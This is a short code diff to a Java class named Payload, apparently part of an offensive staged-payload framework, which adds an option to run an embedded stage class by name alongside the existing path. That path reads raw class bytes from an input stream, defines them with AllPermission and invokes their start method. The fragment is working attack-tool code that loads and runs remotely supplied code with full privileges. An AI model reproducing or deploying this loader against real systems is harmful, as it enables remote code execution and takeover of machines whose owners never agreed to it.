@@ -203,7 +203,7 @@ public class Payload extends ClassLoader {
 			for (int i = 0; i < stageParams.length; i++) {
 				stageParams[i] = stageParamTokenizer.nextToken();
 			}
-			new Payload().bootstrap(in, out, stageParams);
+			new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
 		}
 	}
 
@@ -218,20 +218,24 @@ public class Payload extends ClassLoader {
 		fos.close();
 	}
 	
-	private final void bootstrap(InputStream rawIn, OutputStream out, String[] stageParameters) throws Exception {
+	private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
 		try {
 			final DataInputStream in = new DataInputStream(rawIn);
 			Class clazz;
 			final Permissions permissions = new Permissions();
 			permissions.add(new AllPermission());
 			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
-			int length = in.readInt();
-			do {
-				final byte[] classfile = new byte[length];
-				in.readFully(classfile);
-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
-				length = in.readInt();
-			} while (length > 0);
+            if (embeddedStageName == null) {
+                int length = in.readInt();
+                do {
+                    final byte[] classfile = new byte[length];
+                    in.readFully(classfile);
+                    resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
+                    length = in.readInt();
+                } while (length > 0);
+            } else {
+                clazz = Class.forName("javapayload.stage."+embeddedStageName);
+            }
 			final Object stage = clazz.newInstance();
 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, stageParameters });
 		} catch (final Throwable t) {
